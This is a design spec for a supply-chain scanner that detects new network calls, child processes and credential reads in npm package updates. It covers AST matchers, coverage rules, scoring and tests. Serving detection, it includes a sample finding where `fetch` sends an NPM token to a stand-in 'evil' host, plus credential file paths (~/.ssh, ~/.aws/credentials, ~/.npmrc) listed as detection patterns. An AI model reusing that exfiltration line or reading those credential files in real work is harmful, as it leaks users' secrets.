# LockRay M4.2 — AST Capability Detection Design

**Status:** Spec, pre-implementation
**Date:** 2026-04-24
**Author:** Diego Vaillé (with Claude)
**Ships as:** `v0.4`
**Follows:** v0.3.1 (f8277c6 on main) — PrReport schema + scoring engine
**Queues:** M4.2.1 (obfuscation heuristics), M4.2.2 (install-script AST/shell promotion), M4.3 (bundled-CLI Action variant)

---

## 1. Problem

LockRay v0.3 ships a scoring engine whose `NEW_NETWORK_CALL`, `NEW_CHILD_PROCESS`, `NEW_CREDENTIAL_ACCESS`, and `OBFUSCATED_CODE` rule codes are wired into the `compound.ts` bonus table and into the severity weights — but the detection layer never produces any of them. The classifier emits only `INTEGRITY_MISMATCH`, `NEW_DEPENDENCY_SOURCE`, `MALICIOUS_INSTALL_SCRIPT` (shell regex), `NEW_POSTINSTALL_SCRIPT`, `KNOWN_COMPROMISED_PACKAGE`, and `CVE_VULNERABILITY`. The three AST-backed capability codes are silent rule-slots.

The result: a dependency update that adds a brand-new `fetch()` call in `scripts/postinstall.js` and reads `process.env.NPM_TOKEN` would score only 75 × 1.0 = 75 from `NEW_POSTINSTALL_SCRIPT`. The composed exfil pattern (+20 compound bonus) never fires because the two underlying rule codes never produce findings. LockRay sees the shape of the hook but not what the hook does.

M4.2 fills that gap for the capability-introduction family. Obfuscation heuristics and install-script AST upgrade remain separately queued.

---

## 2. Scope

### 2.1 In scope (ships as v0.4)

Three AST-backed rules that augment the existing heuristic detection layer (not replacing MALICIOUS_INSTALL_SCRIPT; that continues to run its current regex matcher unchanged):

| Code | Severity | Confidence | Matchers |
|------|----------|------------|----------|
| `NEW_NETWORK_CALL` | HIGH | 0.80 | `fetch`, `XMLHttpRequest`, `http.request`, `https.request`, `net.connect`, `require("http"/"https"/"net"/"axios")` call patterns |
| `NEW_CHILD_PROCESS` | HIGH | 0.85 | `child_process.exec`, `execFile`, `spawn`, `fork`; `require("child_process")` call patterns |
| `NEW_CREDENTIAL_ACCESS` | HIGH | 0.75 | `process.env` reads; reads of known credential file paths (`~/.npmrc`, `~/.ssh/*`, `~/.aws/credentials`, `~/.netrc`); `os.homedir()` followed by credential-path access within the same expression |

Supporting infrastructure:

- **`@babel/parser` + `@babel/traverse` + `@babel/types` as parser frontend.** JS/TS/JSX/TSX, tolerant of real-world ecosystem code, isolated inside `ast/parser.ts` + `ast/walker.ts` + `ast/matchers/*.ts`. Babel types never leak out of those files.
- **Normalized `Capability` internal shape.** Rule engine operates on `{matcher, rule, filePath, snippet}` tuples, not on AST nodes. Parser library is swappable.
- **Explicit parse-outcome states** surfaced in debug coverage statistics: `parsed`, `skipped: unsupported-extension | too-large | minified-or-bundled | non-runtime-path`, `error`. Manifest-resolution failures count separately.
- **Coverage policy:** all JS/TS files under tarball root by default, SKIP_DIRS + SKIP_PATTERNS + size cap, with manifest-reference forced-include override (no escape hatch for postinstall-presence alone).
- **Bucket split:** per-package `install` vs `runtime` capability sets. A capability is `new` if `after.install - before.install` or `after.runtime - before.runtime` is non-empty per matcher. **One `Finding` per `(rule, contextBucket)` pair per package** — the aggregation layer collapses multiple newly-introduced matchers of the same rule (e.g., both `fetch` and `https.request` newly appearing in the install bucket) into a single `NEW_NETWORK_CALL` finding whose evidence lists every newly-introduced matcher. Maximum two findings per rule per package (install + runtime).
- **Structured `contextBucket` field on `Finding`.** Scoring's compound-bonus detector reads it to enforce bucket-local co-occurrence. Legacy findings with `contextBucket: undefined` retain pre-M4.2 compound semantics.
- **`sourceFiles?: ReadonlyMap<string, string>`** extension on `FetchedPackage`. Real pacote-backed fetcher populates it from the extracted tarball; stub fetcher accepts it in test fixtures.

### 2.2 Out of scope (explicitly deferred)

- **`OBFUSCATED_CODE`** — entropy heuristics + packer detection. Different engine shape. Ships as M4.2.1.
- **`MALICIOUS_INSTALL_SCRIPT` AST upgrade** — shell parsing, install-hook body semantics. Different target. Ships as M4.2.2.
- **Python (PyPI analyzer).** The `Capability` shape is language-neutral but the matchers and parser are JS/TS only.
- **Yarn Berry lockfile.** Out of scope for the whole v1.0 cycle per spec §4.
- **Dataflow / alias chasing.** No `const exec = child_process.exec; exec(...)` resolution. Direct `child_process.exec(...)` only.
- **Dynamic `require(expr)` resolution.** Computed module names don't resolve.
- **Score-weight changes.** Severity weights, thresholds, and compound-bonus amounts in `@lockray/scoring/src/weights.ts` remain at v0.3 values. M4.2 populates the existing slots.
- **Compound-bonus table changes.** The three bonuses in `DEFAULT_COMPOUND_BONUSES` are unchanged; only their firing semantics gain the bucket-local constraint.

### 3.3 Type contracts

```ts
export interface Capability {
  /** Matcher id — stable across versions, e.g. "http.request", "process.env.read". */
  matcher: string;
  /** Which rule family this matcher contributes to. */
  rule: "NEW_NETWORK_CALL" | "NEW_CHILD_PROCESS" | "NEW_CREDENTIAL_ACCESS";
  /** Tarball-root-relative POSIX path. ALWAYS POSIX-separated, ALWAYS relative. */

  /** Single-line normalized source snippet, length ≤ 120 chars. */
  snippet: string;
}
```

Parser result with explicit degradation states:

```ts
// packages/analyzer-npm/src/ast/parser.ts

  | { status: "parsed"; ast: File; warnings: string[] }
```

### 3.5 Coverage algorithm (`planCoverage(packageJson, sourceFiles)`)

1. **Initialize** `parse = {}`, `skip = {}`, `unresolvedScriptTargets = []`.
2. **Build forced-include set** by walking these `packageJson` fields:
   - `main`, `module`, `browser`, `exports.*` (recursive through string values and nested records), `bin.*` (string or record), `scripts.preinstall`, `scripts.install`, `scripts.postinstall`, `scripts.prepare`.
   - For each value, run the script-target extractor defined below. It returns **either** one resolvable file path OR `null` (record the value in `unresolvedScriptTargets`). Hit → add to forced-include, tagged `bucket: install` if from a `scripts.*` field, else `bucket: runtime`. Miss → `unresolvedScriptTargets`.

   **Script-target extractor** (applies per field value):
   - `main`, `module`, `browser`, `exports.*`, `bin.*`: value is always a plain path; trim whitespace, strip a leading `./`, feed to the resolution ladder. No shell tokenization.
   - `scripts.*`: the value is a shell command, so extract the invoked file path heuristically:
     1. Tokenize on whitespace, respecting single and double quotes (simple shlex-like split — no env expansion, no backticks, no pipes).
     2. **Reject (return `null`) if any of these tokens appear anywhere in the token list:** `|`, `&&`, `||`, `;`, `&`, `` ` ``, `$(`, `>`, `<`, `node -e`, `node --eval`, `sh -c`, `bash -c`, `zsh -c`, `npm run`, `npx` (followed by a package name rather than a file).
     3. Otherwise, locate the **first token that looks like a file path** — defined as: begins with `./`, `../`, or `/`, OR contains a `/`, OR ends with one of `.js` `.mjs` `.cjs` `.jsx` `.ts` `.tsx`. If found → feed to the resolution ladder. If not found → return `null`.
     4. Common accepted forms: `./setup.js`, `node ./setup.js`, `node scripts/postinstall`, `node scripts/postinstall.js`, `./build.sh` (the extractor accepts this; the resolver rejects it because `.sh` isn't in `ALLOWED_EXTENSIONS`; the result is `unresolvedScriptTargets`).
     5. Common rejected forms: `node -e "require('x')"`, `curl ... | sh`, `echo hi && node x.js`, `npm run build`. These hide file targets behind shell composition the extractor deliberately does not interpret.
3. **Resolution ladder** for a manifest-referenced path `P`:
   - (a) Exact: is `P` (or `P` with leading `./` stripped) a key in `sourceFiles`? If yes, resolved.
   - (b) Append extension: try `P + ext` for each `ALLOWED_EXTENSIONS`. First hit wins.
   - (c) Directory-style: try `P/index + ext` for each `ALLOWED_EXTENSIONS`. First hit wins.
   - (d) Miss → `unresolvedScriptTargets` entry.
4. **Bucket union rule:** a path attributed both as `runtime` (e.g., `main`) and `install` (e.g., a lifecycle script references it) is tagged `bucket: install` (install wins — the install-time execution is the load-bearing risk).
5. **For every key in `sourceFiles`:**
   - **In forced-include AND size ≤ `MAX_FILE_BYTES`:** → `parse` with the attributed bucket. `forced: true`.
   - **In forced-include AND size > `MAX_FILE_BYTES`:** → `skip` with reason `too-large` (logged as "forced-include skipped: too-large" in debug; does NOT suppress the rest of the forced-include set).
   - **Not in forced-include:** apply skip rules in order:
     1. Extension not in `ALLOWED_EXTENSIONS` → `skip: unsupported-extension`.
     2. Size > `MAX_FILE_BYTES` → `skip: too-large`.
     3. Path matches any `SKIP_PATTERNS` → `skip: minified-or-bundled` (for `*.min.js` / `*.bundle.js`) or `skip: non-runtime-path` (for `*.test.*` / `*.spec.*`).
     4. Any directory component is in `SKIP_DIRS` → `skip: non-runtime-path`.
     5. Else → `parse` with `bucket: runtime`, `forced: false`.

**Forced-include beats all skip rules.** A lifecycle script pointing at `docs/setup.js` parses that file despite `docs/` being a SKIP_DIR.

### 3.6 Matcher authoring

Each matcher is a small module exporting `{id, rule, visitor}`:

```ts
// packages/analyzer-npm/src/ast/matchers/network.ts (abbreviated)
import type { NodePath } from "@babel/traverse";
import type { CallExpression, Node } from "@babel/types";
import type { Capability } from "../capability-shape.js";

export interface Matcher {
  id: string;
  rule: Capability["rule"];
  /** Return a Capability if this node matches this matcher, else null. */
  check(path: NodePath<Node>, source: string, filePath: string): Capability | null;
}

export const NETWORK_MATCHERS: readonly Matcher[] = [
  { id: "fetch", rule: "NEW_NETWORK_CALL", check: /* ... */ },
  { id: "http.request", rule: "NEW_NETWORK_CALL", check: /* ... */ },
  // ...
];
```

The walker registers one combined visitor from all matchers and runs them in a single AST traversal per file. Snippet extraction uses `@babel/types.start/end` offsets into the original source string, normalized to a single line and truncated to 120 chars with ellipsis.

### 3.6.1 Aggregation: diffs → findings

`capabilityDiffToFindings(diffs, change): Finding[]` groups `CapabilityDiff[]` by `(rule, bucket)` before emitting findings. All diffs sharing the same `(rule, bucket)` pair fold into a single `Finding`:

- `code`: the shared `rule`.
- `contextBucket`: the shared `bucket`.
- `evidence`: **one evidence entry per newly-introduced matcher in the group**, preserving `afterFiles` and `sampleSnippet` from that matcher's diff. The first matcher's evidence leads; the rest follow in alphabetical order of matcher id. This keeps review ergonomics (one finding per rule per bucket) while retaining per-matcher detail for reviewers.
- `confidence`: the rule's configured confidence (`0.80` for NETWORK, `0.85` for CHILD_PROCESS, `0.75` for CREDENTIAL_ACCESS). Aggregation does not compound confidence — multiple matchers within one rule mean more evidence, not more certainty of threat.
- `title`: references the rule and bucket; the aggregated matcher list appears in evidence, not the title.

This collapses the (matcher, bucket) diff shape — which is the right internal currency — into the (rule, bucket) finding shape the UX contract promises. A package that newly introduces both `fetch` and `https.request` in install context produces ONE `NEW_NETWORK_CALL` finding, not two.

### 3.7 Scoring integration

`@lockray/scoring/src/compound.ts` adds one change: the `matches(codes, bonus)` check is replaced with a bucket-aware version that iterates `findings` (not just `codes`) and requires the matched findings to share a `contextBucket` value:

```ts
function compoundApplies(findings: readonly Finding[], bonus: CompoundBonus): boolean {
  // Group findings by contextBucket (undefined is its own "legacy" bucket).
  const byBucket = new Map<string | undefined, Set<string>>();
  for (const f of findings) {
    const key = f.contextBucket; // undefined, "install", or "runtime"
    const set = byBucket.get(key) ?? new Set<string>();
    set.add(f.code);
    byBucket.set(key, set);
  }
  // Bonus applies if any single bucket contains all required codes.
  for (const codes of byBucket.values()) {
    if (bonus.codes.every((c) => codes.has(c))) return true;
  }
  return false;
}
```

This preserves pre-M4.2 semantics (findings with `contextBucket: undefined` all fall in the same "legacy" group, so existing bonus tests remain green) while enforcing bucket-local co-occurrence for AST findings.

### 3.8 Fetcher responsibilities

**CLI (`packages/cli/src/tarball/pacote-fetcher.ts`):** after `pacote.extract` into `tmpdir`:
1. Recursively walk the extracted directory.
2. For each regular file whose extension ∈ `ALLOWED_EXTENSIONS ∪ {".json"}` (package.json still needed) AND whose size ≤ `MAX_FILE_BYTES` (500KB — the same cap the coverage planner would apply): read as UTF-8, store in `sourceFiles` map under the tarball-root-relative POSIX path.
3. Files above `MAX_FILE_BYTES` → **not loaded into `sourceFiles`**, no error thrown. They are invisible to coverage planning because they never enter `sourceFiles.keys()`. Result: forced-include AND non-forced oversized files are all gracefully skipped downstream. This keeps oversized files a per-file analysis skip, not a package-level fatal error. No `too-large` skip reason surfaces in `CoveragePlan.skip` from this path (the file is absent from the input), which is consistent because coverage is planned from `sourceFiles` content, not from the tarball directory.
4. Binary / unsupported-extension files → skipped, not in `sourceFiles`. They'd be parse-skipped anyway; not worth the memory.
5. `FetchedPackage.packageJson` stays as-is; `sourceFiles` is additive.

**Note on the `too-large` skip reason.** It remains meaningful for testing and for stub/custom fetchers that may populate `sourceFiles` with larger-than-cap content (e.g., a fixture explicitly exercising the coverage planner's size-cap branch). The production pacote-fetcher pre-filters by size, so in practice the `too-large` counter will be zero for real tarballs unless a consumer populates `sourceFiles` directly. If future telemetry shows operators want visibility into "files the fetcher dropped for being too large," that's a coverage-stats extension rather than a fetcher change.

**Stub fetcher (`packages/analyzer-npm/src/tarball/stub-fetcher.ts`):** `createStubFetcher(registry)` already accepts `FetchedPackage` entries. Consumers pass `sourceFiles` explicitly when they want AST analysis exercised; omitting it keeps pre-M4.2 behavior (AST branch no-ops).

## 4. Evidence & finding format

One `Finding` per `(rule, contextBucket)` pair per package — so a package where `fetch()` is newly introduced in BOTH install and runtime contexts produces two separate `NEW_NETWORK_CALL` findings (one per bucket), and a package that newly introduces both `fetch` AND `https.request` in install context produces ONE `NEW_NETWORK_CALL` finding whose `evidence` array has one entry per newly-introduced matcher.

Example finding from the `ast-exfil-in-postinstall` corpus fixture (which introduces both `fetch` and `https.request` in install context — aggregated into one finding):

```json
{
  "code": "NEW_NETWORK_CALL",
  "title": "mal-pkg@1.0.1: new NEW_NETWORK_CALL capability in install context",
  "severity": "high",
  "confidence": 0.80,
  "evidence": [
    {
      "kind": "code-snippet",
      "metadataField": "ast.install.fetch",
      "newValue": "fetch(`https://evil/?t=${process.env.NPM_TOKEN}`)",
      "confidenceReason": "New in install context. Before: false. After files: scripts/postinstall.js",
      "remediationHint": "Inspect the install hook's network call. A newly introduced request from install-time code is a common exfil pattern."
    },
    {
      "kind": "code-snippet",
      "metadataField": "ast.install.https.request",
      "newValue": "https.request(urlWithToken, opts)",
      "confidenceReason": "New in install context. Before: false. After files: scripts/postinstall.js",
      "remediationHint": "Inspect the install hook's network call. A newly introduced request from install-time code is a common exfil pattern."
    }
  ],
  "ecosystem": "npm",
  "packageName": "mal-pkg",
  "packageVersion": "1.0.1",
  "direct": true,
  "escalated": false,
  "contextBucket": "install"
}
```

Note: the `confidence` is the rule-level constant (0.80), not multiplied by the number of matchers. Multiple matchers within a rule increase evidence richness, not scoring weight.

Scoring: `HIGH × 0.80 × direct 1.0 = 24` raw contribution. A sibling `NEW_CREDENTIAL_ACCESS` finding in the same install bucket adds `HIGH × 0.75 × 1.0 = 22.5`. Because both findings share `contextBucket: "install"`, the `NEW_NETWORK_CALL + NEW_CREDENTIAL_ACCESS` compound bonus (+20) applies bucket-locally. Package score: `24 + 22.5 + 20 = 66.5 → round 67 → verdict block` (threshold 60). Combined with the existing `NEW_POSTINSTALL_SCRIPT` the fixture already carries (critical × 0.9 × direct = 67.5 → 68), the package hits the 100 cap via hard-fail-free accumulation.

## 5. Testing strategy

### 5.1 Unit tests (~42 new)

- **Parser (`parser.test.ts`, 4 tests):** parses JS, parses TS, parses JSX, returns `{status: "error", message}` without throwing on syntax errors.
- **Walker (`walker.test.ts`, 2 tests):** visitors fire; exits walked.
- **Coverage (`coverage.test.ts`, 10 tests):**
  - Resolution ladder covers exact, `+.js`, `/index.js`.
  - SKIP_DIRS skips `test/`, `docs/`, `examples/`, `fixtures/`.
  - SKIP_PATTERNS skips `*.test.ts`, `*.min.js`.
  - Size cap skips > 500KB as `too-large`.
  - Forced-include overrides a SKIP_DIR (docs/postinstall.js when referenced by a lifecycle script).
  - Forced-include + too-large logs "forced-include skipped: too-large"; counter increments; rest of forced-include set still parses.
  - `node -e "..."` lifecycle script goes to `unresolvedScriptTargets`, not to skip or parse.
  - Install-bucket wins union when a path is attributed both as `main` and as a lifecycle target.
  - Extension not in ALLOWED_EXTENSIONS → `unsupported-extension` skip.
  - Bare binary/image files in source-file map → `unsupported-extension` skip.
- **Matchers (network/child-process/credential-access, ~5 tests each, 15 total):**
  - Each matcher fires on every API in its list.
  - One negative per matcher (wrong receiver, `require("other-module")`).
- **File capabilities (`file-capabilities.test.ts`, 4 tests):**
  - Capabilities split across install/runtime buckets per coverage-plan attribution.
  - Coverage counters accurate (pinned against a 5-file mixed fixture: 1 runtime parse, 2 skipped-non-runtime, 1 forced-include install, 1 skipped-minified).
  - Parse errors counted in `coverage.errors`, do not crash.
  - **Forced-include file with invalid JS/TS increments errors counter and does NOT emit a finding.**
- **Diff (`diff.test.ts`, 6 tests):**
  - New-in-after → one diff emitted.
  - Present-in-both → no diff.
  - Disappeared-in-after → no diff.
  - Capability present in `before.runtime`, new in `after.install` → fires `bucket: install`.
  - Capability new in both buckets → two diffs for same matcher.
  - **Capability new in a file that didn't exist in before → fires** (new-file case explicit).
- **Findings (`findings.test.ts`, 3 tests):** rule code matches matcher's rule; `contextBucket` set; evidence carries `afterFiles` + `sampleSnippet` + `beforePresent`/`afterPresent` in `confidenceReason`.

## 6. Risks and mitigations

### 6.1 Bundle size

`@babel/parser` + `@babel/traverse` + `@babel/types` add ~2.5MB to the analyzer-npm package tree. The Action bundle is unaffected (Action reads pre-computed PrReport JSON; AST analysis runs only in the CLI). CLI is npm-distributed; size grows but is acceptable.

### 6.2 Parse budget on real packages

A tarball with 200 matching files × ~10ms/file parse time = 2s added latency. With the skip list (default-skip for `docs/`, `examples/`, `fixtures/`, `test/`, `tests/`, `__tests__/`, `spec/`, `__mocks__/`), typical packages parse 5–20 files in under 200ms.

### 6.3 False positives from dataflow-oblivious matching

Matchers are direct-usage only (`fetch(...)`, `http.request(...)`, `process.env.X`). A package that imports `http` into a local alias (`const {request: httpReq} = require("http"); httpReq(...)`) or wraps `process.env` in a utility function does NOT fire. This is **intentional for v0.4** — the plan's guardrail explicitly says "no deep alias chasing." False negatives are acceptable; false positives on refactors are the real signal-quality killer and the bucket split + package-level diff specifically minimizes those.

### 6.4 Unresolvable lifecycle scripts

Packages that use `scripts.postinstall: "node -e '...'"` or `"sh -c ..."` produce entries in `unresolvedScriptTargets`. No inference, no guessing — debug output shows the unresolved targets, and the install-bucket capability set for that package is empty. Tradeoff: packages that hide exfil inside an unresolvable script form evade the install-bucket rule. That's a known M4.2 limitation; M4.2.2 (shell/install-script AST promotion) is where this gap closes.

### 6.5 Contract stability of `Finding.contextBucket`

Adding an optional field to `Finding` is additive and non-breaking. External consumers (`@lockray/cli` JSON output, `@lockray/action` rendering) pass through whatever the analyzer emits. The scoring engine's `compound.ts` is the only consumer that interprets the field; pre-M4.2 findings without the field continue to work because `undefined` is its own bucket-group.

### 6.6 `sourceFiles` size for huge packages

A package with hundreds of large files could push the in-memory map past 100MB. The 10MB per-file hard cap + coverage-skip for test/docs/examples/fixtures contains typical packages to under 10MB. For pathological cases the CLI process's default heap (4GB on Node 22 with default `--max-old-space-size`) absorbs it. M4.2 does not introduce a package-level size cap; if a real-world report surfaces one, M4.2.1 or M6 can add it.
